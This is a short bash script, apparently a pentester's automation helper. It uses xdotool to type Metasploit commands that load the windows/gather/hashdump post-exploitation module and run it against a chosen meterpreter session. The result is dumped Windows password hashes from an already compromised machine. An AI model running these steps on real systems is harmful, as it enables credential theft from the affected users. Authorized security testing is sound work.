#!/bin/bash

: '
meterpreter: set windows post hash dump
'

source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
source ~/Desktop/base/code/xdotool/helpers/find_and_replace_in_file.sh

# Generate gui form
generate_form "SESSION"

SESSION=${form_data["SESSION"]}

paste_command "use windows/gather/hashdump"
xdotool key Return
sleep 0.8

paste_command "sessions"
xdotool key Return
sleep 0.8

paste_command "set SESSION ${SESSION}"
xdotool key Return
sleep 0.8

paste_command "exploit"
xdotool key Return

